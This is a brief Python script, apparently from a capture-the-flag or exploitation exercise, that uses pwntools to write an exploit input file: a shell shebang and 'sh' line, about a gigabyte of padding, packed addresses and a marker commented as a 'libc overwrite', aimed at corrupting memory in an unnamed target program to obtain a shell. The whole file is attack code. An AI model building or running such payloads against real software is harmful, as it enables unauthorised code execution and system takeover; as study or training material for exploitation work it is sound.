#!/usr/bin/env python3

import sys
from pwn import *

file = open("patt", "wb")
longstr = b'y'*1090519038 # b'y'*2186534896
file.write(b'#!/bin/sh\n')
file.write(b'sh\n')
file.write(longstr)
file.write(p64(0))
file.write(p64(0x5bf002))
file.write(b'\n')
# file.write(longstr)
file.write(b'AAAA') # libc overwrite
file.write(b'\n')
file.close()